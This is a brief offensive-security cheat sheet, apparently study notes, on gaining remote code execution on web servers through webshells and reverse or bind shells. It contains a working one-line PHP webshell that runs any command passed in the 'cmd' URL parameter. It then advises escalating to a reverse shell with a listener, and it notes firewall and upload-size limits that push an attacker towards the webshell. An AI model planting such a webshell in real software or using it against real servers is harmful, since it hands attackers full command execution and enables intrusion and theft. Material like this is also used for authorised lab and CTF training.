## Ways to achive RCE:

#### 1: Webshells

#### 2: Reverse/bind shells

## Backend languages you may encounter: PHP, Python (Django, Flask, etc), Javascript (Node.js)

## Webshells

### Webshells can be used to extend to a reverse shell, but it might be the only option available if:

#### 1: There is a file length limit on uploads

#### 2: Firewall rules prevent any network-based shells

## PHP Webshell example:

### <?PHP echo system($_GET['cmd']); ?>

#### Write reverse shell (URL Encoded, or Base64 encoded) then set up listener and GG!
